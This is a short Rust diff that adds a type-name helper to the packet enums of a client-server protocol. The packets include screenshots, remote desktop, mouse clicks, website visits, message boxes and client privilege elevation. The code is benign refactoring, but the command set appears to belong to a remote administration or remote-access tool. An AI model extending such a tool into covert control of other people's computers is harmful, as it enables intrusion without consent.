@@ -19,6 +19,7 @@ pub trait Packet {
     fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error>
     where
         Self: std::marker::Sized;
+    fn get_type(&self) -> &'static str;
 }
 
 /// Packets going from client to the server.
@@ -41,6 +42,16 @@ impl Packet for ServerboundPacket {
     fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error> {
         let mut d = Deserializer::new(buf);
         Self::deserialize(&mut d).map(|p| (p, d.into_inner()))
+    }
+
+    fn get_type(&self) -> &'static str {
+        match self {
+            ServerboundPacket::EncryptionRequest => "EncryptionRequest",
+            ServerboundPacket::EncryptionConfirm(_, _) => "EncryptionConfirm",
+            ServerboundPacket::ClientInfo(_) => "ClientInfo",
+            ServerboundPacket::ScreenshotResult(_) => "ScreenshotResult",
+            ServerboundPacket::RemoteDesktopFrame(_) => "RemoteDesktopFrame",
+        }
     }
 }
 
@@ -72,6 +83,24 @@ impl Packet for ClientboundPacket {
     fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error> {
         let mut d = Deserializer::new(buf);
         Self::deserialize(&mut d).map(|p| (p, d.into_inner()))
+    }
+
+    fn get_type(&self) -> &'static str {
+        match self {
+            ClientboundPacket::CloseClientSession => "CloseClientSession",
+            ClientboundPacket::EncryptionResponse(_, _) => "EncryptionResponse",
+            ClientboundPacket::EncryptionAck => "EncryptionAck",
+            ClientboundPacket::InitClient => "InitClient",
+            ClientboundPacket::ScreenshotDisplay(_) => "ScreenshotDisplay",
+            ClientboundPacket::Reconnect => "Reconnect",
+            ClientboundPacket::Disconnect => "Disconnect",
+            ClientboundPacket::StartRemoteDesktop(_) => "StartRemoteDesktop",
+            ClientboundPacket::StopRemoteDesktop => "StopRemoteDesktop",
+            ClientboundPacket::MouseClick(_) => "MouseClick",
+            ClientboundPacket::VisitWebsite(_) => "VisitWebsite",
+            ClientboundPacket::ShowMessageBox(_) => "ShowMessageBox",
+            ClientboundPacket::ElevateClient => "ElevateClient",
+        }
     }
 }
 
